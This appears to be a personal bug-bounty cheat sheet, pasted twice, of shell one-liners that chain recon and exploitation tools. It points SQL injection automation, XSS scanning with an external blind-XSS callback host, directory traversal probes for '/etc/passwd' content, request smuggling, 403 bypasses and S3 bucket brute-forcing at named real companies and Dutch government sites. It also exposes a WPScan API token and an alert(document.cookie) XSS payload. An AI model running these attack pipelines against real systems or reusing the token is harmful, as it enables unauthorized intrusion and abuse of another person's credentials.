cyb3rl1p0n@wearehackerone.com
--------------------------------------------------------------
go install github.com/tomnomnom/assetfinder@latest
go install github.com/michenriksen/gitrob@latest
===============================================================
Using awk you can extract a domain name from an URL:
cat DutchGov.txt | awk -F[/:] '{print $4}'
===============================================================

sudo cp assetfinder /usr/local/bin/

/root/go/bin
cp gf /usr/local/bin
sudo mv unfurl /usr/local/bin/

Python Tool Access Fron Any Display:
>> sudo ln -sfv /opt/Sublist3r/sublist3r.py /usr/bin/sublist3r
--------------------------------------------------------------
Bug Bounty Sqli Automation:
--------------------------
>> httpx -l starbucks.txt --silent --threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx --silent| anew | waybackurls | gf sqli ; sqlmap -m sqli --batch --random-agent --level 1'

Find XSS Automation:
-------------------
>> echo https://testphp.vulnweb.com/ | waybackurls | kxsss
>> assetfinder testphp.vulnweb.com | gau | dalfox pipe

ParamSpider + Dalfox:
--------------------
>> python3 paramspider.py --domain testphp.vulnweb.com
>> cat testphp.vulnweb.com.txt | dalfox pipe

Waybackurls + Dalfox:
---------------------
>> cat testphpwayback.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe

Dalfox + Waybackurls:
--------------------
>> dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://cyberlipon.xss.ht

XSS Vulnerability Find - Automatic Way!
---------------------------------------
Gxss:
-----
cat testvuln.txt | Gxss

Dalfox:
-------
cat testvuln.txt | Gxss -p FUZZ | dalfox pipe --mining-dict /home/kali/params.txt --skip-bav

Subdomain Takeover Automation:
------------------------------
>> subfinder -d razer.com | httpx --status-code --title
>> subover -l razer.txt -a
>> subzy -targets yahoo.txt
>> subjack -w shopify.txt -t 100
>> python3 sub404.py -f subdomain.txt

Wordpress Site Bug Bounty:
--------------------------
>> wpscan --url https://wordpress.org

Parameters Scanning:
-------------------
>> cat statbucks.txt | httpx --silent | subjs | anew
>> ./paramspider.py -d google.com
>> python3 paramspider.py --domain testphp.vulnweb.com -o /home/kali/testvuln.txt

Knockpy - Subdomian Finding:
----------------------------
>> python3 knockpy.py starbucks.com

Amass - Subdomain Finding:
-------------------------
>> amass enum -d tesla.com -passive -o /root/Downloads/demo.txt

Subfinder - Subdomain Finding:
------------------------------
>> subfinder -d paytm.com -v

Fuzzing & Sensetive File Enumeration:
-------------------------------------
>> ffuf -u "https://www.danareksa-research.com/FUZZ" -w shifa.txt -c -r -v 

SecretFinder - Api leys, Aws key, Google Cloud Key from Source Code & js file:
------------------------------------------------------------------------------
>> subfinder -d starbucks.com | waybackurls | grep "\.js" | tee jsfile.txt
>> cat jsfile.txt | xargs -I@ sh -c 'python3 /home/kali/Desktop/Tool/SecretFinder/SecretFinder.py -i @'

LFI Vulnerability Finding:
-------------------------
>> cat googleurls.txt | gf lfi | tee lfi.txt 
>> cat lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/wordlist/LFI.txt; done

SSRF Vulnerability Finding:
---------------------------
>> findomain -t DOMAIN -q | httpx --silent --threads 1000 | gau | grep "=" | qsreplace http://YOUR.burplocator.net

Dirsearch - Content Discovery:
------------------------------
>> dirsearch.py -u http://scanme.nmap.org -e php,zip, aspx,env,xml,bak,conf

CORS misconfiguration Vulnerability:
------------------------------------
>> python3 corsy.py -u https://newsroom.tiktok.com
>> python3 corsy.py -i tiktok.live.txt

HTTprobe --- Subdomains Status Check:
-------------------------------------
>> cat shopify.txt | httprobe -s -p http:80
>> cat subs.txt | --httpx --status-code --title --threads 100

Assetfinder ---- Subdomain Finder:
----------------------------------
>> assetfinder --subs-only shopify.asset.txt

HTTPx --- Subdomain Status Check:
---------------------------------
>> cat shopify.txt | httpx --status-code --title --threads 100

Open Redirect with Burp Collaborator & FFUF:
-------------------------------------------
>> ffuf -c -u "FUZZ///w2z2kz8nusc6jso5m475xjmdw42uqj.burpcollaborator.net" -r -w venmo.txt

Find & Exploit Directory Traversal Vulnerability: 
-------------------------------------------------
>> ./dotdotpwn.pl -m http-url -u https://www.starbucks.com/account/signin?RedirectUrl=TRAVERSAL -k "root:"
>> dotdotpwn -m http-url -u https://int.customercare.23andme.com/hc/en-us/signin?return_to=TRAVERSAL -k "root:"

OWASP - Amass subdomain enumeretion + Aquatone :
------------------------------------------------
>> amass -active -brute -o output.txt -d netflix.com
>> cat output.txt | aquatone --threads 20

Clickjack - Python Tool for Clickjscking Vulnerabilities finding: 
----------------------------------------------------------------
>> sudo python clickjack.py http://testphp.vulnweb.com

WPScan -- Wordpress Site Vulnerability Scan:
-------------------------------------------
>> wpscan --url https://www.wlo2015.nl --api-token eikB6ZqJLw1iaPWt2PieswjuC4Mh4ROTdqcXujCFniM --random-user-agent

Droopescan ---- Drupal Site Vulnerability Scan:
----------------------------------------------
>> droopescan scan drupal -u https://www.rvs.rivm.nl

Nuclei - Teplate for Vulnerability Finding:
------------------------------------------
>> nuclei -l wordpress.subs.txt -t /home/kali/nuclei-templates/

Clickjack - Python Tool -- Clickjacking Vulnerability Find:
----------------------------------------------------------
>> python clickjack.py http://testphp.vulnweb.com

OpenRedirex --- Open Redirect Vulnerability:
-------------------------------------------
>> python3 openredirex.py -u "https://www.kisskissbankbank.com/en/search?q=FUZZ" -p payloads.txt --keyword FUZZ

Account Takeover Via HTTP Request Smuggling:
-------------------------------------------
>> python3 smuggler.py -u https://tashboard.shopify.com

Commix -- Automated All-in-One OS Command Injection Exploitation Tool:
----------------------------------------------------------------------
>> python commix.py -h

403bypasser --- bypass 403 permission denied.
--------------------------------------------
>> python3 403bypasser.py -u https://www.pbl.nl/sites/ -d /sites/

Amazon S3 Bucket BruteForcing:
-----------------------------
>> ruby lazys3.rb shopify

HTTPx + Aquatone -- Status Check + Screenshot Automation:
---------------------------------------------------------
>> cat Grab.com.txt | httpx --status-code --title --threads 100 | aquatone --threads 20

Parallel GNU --- Automate Everything For Hacking:
------------------------------------------------
>> parallel -a /home/kali/domains.txt "nslookup {}"
>> parallel -a /home/kali/domains.txt "davtest -url {}"

Fuzzing with SecLists wordlist + FFUF:
>> ffuf -u https://sub.domain.com/admin/FUZZ -w aspfiles.txt -mc 200

HTTP parameter discovery - Arjun can find query parameters for URL endpoints:
----------------------------------------------------------------------------
>> arjun -u https://sub.domain.com/admin/colorpicker_IEPatch.asp

XSS Basic Payload: </script><img src=x onerror=alert(document.cookie)>

Automation --->>> Sensitive Information Disclosure: https://github.com/projectdiscovery/uncover
----------------------------------------------------------------------------------------------
>> uncover -q “target.com” -e censys,fofa,shodan,shodan-idb | httpx | tee ips.txt
>> cat ips.txt

XSS Application Vulnerability - Scan a Web Application ( XSpear ) --- Github
----------------------------------------------------------------------------
>> xspear -u "https://testphp.vulnweb.com/listproducts.php?cat=123" -v

parallel -a DutchGovt.txt "whatweb {}"

subjack -w /home/kali/shopify.com -t 20 -timeout 30 -o /home/kali/subjackresult.txt

parallel -a /home/kali/Desktop/Secrets/DutchGovt.txt "dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u {}"

Scripts----Automation!!!
>> ./crt.sh goteleport.com
>> ./waybackurls.sh goteleport.com
>> cat goteleport.com.txt | ./urlstodomain.sh

NoRLCheck- If all the response headers yeild the same content length, the application gives the same output for different requests, Not Vulnerable Target.
./noratelimcheck.py hackerone.com https






























cyb3rl1p0n@wearehackerone.com
--------------------------------------------------------------
go install github.com/tomnomnom/assetfinder@latest

/root/go/bin
cp gf /usr/local/bin
sudo mv unfurl /usr/local/bin/

Python Tool Access Fron Any Display:
>> sudo ln -sfv /opt/Sublist3r/sublist3r.py /usr/bin/sublist3r
--------------------------------------------------------------
Bug Bounty Sqli Automation:
--------------------------
>> httpx -l starbucks.txt --silent --threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx --silent| anew | waybackurls | gf sqli ; sqlmap -m sqli --batch --random-agent --level 1'

Find XSS Automation:
-------------------
>> echo https://testphp.vulnweb.com/ | waybackurls | kxsss
>> assetfinder testphp.vulnweb.com | gau | dalfox pipe

ParamSpider + Dalfox:
--------------------
>> python3 paramspider.py --domain testphp.vulnweb.com
>> cat testphp.vulnweb.com.txt | dalfox pipe

Waybackurls + Dalfox:
---------------------
>> cat testphpwayback.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe

Dalfox + Waybackurls:
--------------------
>> dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://cyberlipon.xss.ht

XSS Vulnerability Find - Automatic Way!
---------------------------------------
Gxss:
-----
cat testvuln.txt | Gxss

Dalfox:
-------
cat testvuln.txt | Gxss -p FUZZ | dalfox pipe --mining-dict /home/kali/params.txt --skip-bav

Subdomain Takeover Automation:
------------------------------
>> subfinder -d razer.com | httpx --status-code --title
>> subover -l razer.txt -a
>> subzy -targets yahoo.txt
>> subjack -w shopify.txt -t 100
>> python3 sub404.py -f subdomain.txt

Wordpress Site Bug Bounty:
--------------------------
>> wpscan --url https://wordpress.org

Parameters Scanning:
-------------------
>> cat statbucks.txt | httpx --silent | subjs | anew
>> ./paramspider.py -d google.com
>> python3 paramspider.py --domain testphp.vulnweb.com -o /home/kali/testvuln.txt

Knockpy - Subdomian Finding:
----------------------------
>> python3 knockpy.py starbucks.com

Amass - Subdomain Finding:
-------------------------
>> amass enum -d tesla.com -passive -o /root/Downloads/demo.txt

Subfinder - Subdomain Finding:
------------------------------
>> subfinder -d paytm.com -v

Fuzzing & Sensetive File Enumeration:
-------------------------------------
>> ffuf -u "https://www.danareksa-research.com/FUZZ" -w shifa.txt -c -r -v 

SecretFinder - Api leys, Aws key, Google Cloud Key from Source Code & js file:
------------------------------------------------------------------------------
>> subfinder -d starbucks.com | waybackurls | grep "\.js" | tee jsfile.txt
>> cat jsfile.txt | xargs -I@ sh -c 'python3 /home/kali/Desktop/Tool/SecretFinder/SecretFinder.py -i @'

LFI Vulnerability Finding:
-------------------------
>> cat googleurls.txt | gf lfi | tee lfi.txt 
>> cat lfi.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/wordlist/LFI.txt; done

SSRF Vulnerability Finding:
---------------------------
>> findomain -t DOMAIN -q | httpx --silent --threads 1000 | gau | grep "=" | qsreplace http://YOUR.burplocator.net

Dirsearch - Content Discovery:
------------------------------
>> dirsearch.py -u http://scanme.nmap.org -e php,zip, aspx,env,xml,bak,conf

CORS misconfiguration Vulnerability:
------------------------------------
>> python3 corsy.py -u https://newsroom.tiktok.com
>> python3 corsy.py -i tiktok.live.txt

HTTprobe --- Subdomains Status Check:
-------------------------------------
>> cat shopify.txt | httprobe -s -p http:80
>> cat subs.txt | --httpx --status-code --title --threads 100

Assetfinder ---- Subdomain Finder:
----------------------------------
>> assetfinder --subs-only shopify.asset.txt

HTTPx --- Subdomain Status Check:
---------------------------------
>> cat shopify.txt | httpx --status-code --title --threads 100

Open Redirect with Burp Collaborator & FFUF:
-------------------------------------------
>> ffuf -c -u "FUZZ///w2z2kz8nusc6jso5m475xjmdw42uqj.burpcollaborator.net" -r -w venmo.txt

Find & Exploit Directory Traversal Vulnerability: 
-------------------------------------------------
>> ./dotdotpwn.pl -m http-url -u https://www.starbucks.com/account/signin?RedirectUrl=TRAVERSAL -k "root:"
>> dotdotpwn -m http-url -u https://int.customercare.23andme.com/hc/en-us/signin?return_to=TRAVERSAL -k "root:"

OWASP - Amass subdomain enumeretion + Aquatone :
------------------------------------------------
>> amass -active -brute -o output.txt -d netflix.com
>> cat output.txt | aquatone --threads 20

Clickjack - Python Tool for Clickjscking Vulnerabilities finding: 
----------------------------------------------------------------
>> sudo python clickjack.py http://testphp.vulnweb.com

WPScan -- Wordpress Site Vulnerability Scan:
-------------------------------------------
>> wpscan --url https://www.wlo2015.nl --api-token eikB6ZqJLw1iaPWt2PieswjuC4Mh4ROTdqcXujCFniM --random-user-agent

Droopescan ---- Drupal Site Vulnerability Scan:
----------------------------------------------
>> droopescan scan drupal -u https://www.rvs.rivm.nl

Nuclei - Teplate for Vulnerability Finding:
------------------------------------------
>> nuclei -l wordpress.subs.txt -t /home/kali/nuclei-templates/

Clickjack - Python Tool -- Clickjacking Vulnerability Find:
----------------------------------------------------------
>> python clickjack.py http://testphp.vulnweb.com

OpenRedirex --- Open Redirect Vulnerability:
-------------------------------------------
>> python3 openredirex.py -u "https://www.kisskissbankbank.com/en/search?q=FUZZ" -p payloads.txt --keyword FUZZ

Account Takeover Via HTTP Request Smuggling:
-------------------------------------------
>> python3 smuggler.py -u https://tashboard.shopify.com

Commix -- Automated All-in-One OS Command Injection Exploitation Tool:
----------------------------------------------------------------------
>> python commix.py -h

403bypasser --- bypass 403 permission denied.
--------------------------------------------
>> python3 403bypasser.py -u https://www.pbl.nl/sites/ -d /sites/

Amazon S3 Bucket BruteForcing:
-----------------------------
>> ruby lazys3.rb shopify

HTTPx + Aquatone -- Status Check + Screenshot Automation:
---------------------------------------------------------
>> cat Grab.com.txt | httpx --status-code --title --threads 100 | aquatone --threads 20

Parallel GNU --- Automate Everything For Hacking:
------------------------------------------------
>> parallel -a /home/kali/domains.txt "nslookup {}"
>> parallel -a /home/kali/domains.txt "davtest -url {}"

Fuzzing with SecLists wordlist + FFUF:
>> ffuf -u https://sub.domain.com/admin/FUZZ -w aspfiles.txt -mc 200

HTTP parameter discovery - Arjun can find query parameters for URL endpoints:
----------------------------------------------------------------------------
>> arjun -u https://sub.domain.com/admin/colorpicker_IEPatch.asp

XSS Basic Payload: </script><img src=x onerror=alert(document.cookie)>

Automation --->>> Sensitive Information Disclosure: https://github.com/projectdiscovery/uncover
----------------------------------------------------------------------------------------------
>> uncover -q “target.com” -e censys,fofa,shodan,shodan-idb | httpx | tee ips.txt
>> cat ips.txt

XSS Application Vulnerability - Scan a Web Application ( XSpear ) --- Github
----------------------------------------------------------------------------
>> xspear -u "https://testphp.vulnweb.com/listproducts.php?cat=123" -v

parallel -a DutchGovt.txt "whatweb {}"

subjack -w /home/kali/shopify.com -t 20 -timeout 30 -o /home/kali/subjackresult.txt

parallel -a /home/kali/Desktop/Secrets/DutchGovt.txt "dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u {}"

Scripts----Automation!!!
>> ./crt.sh goteleport.com
>> ./waybackurls.sh goteleport.com
>> cat goteleport.com.txt | ./urlstodomain.sh

NoRLCheck- If all the response headers yeild the same content length, the application gives the same output for different requests, Not Vulnerable Target.
./noratelimcheck.py hackerone.com https






























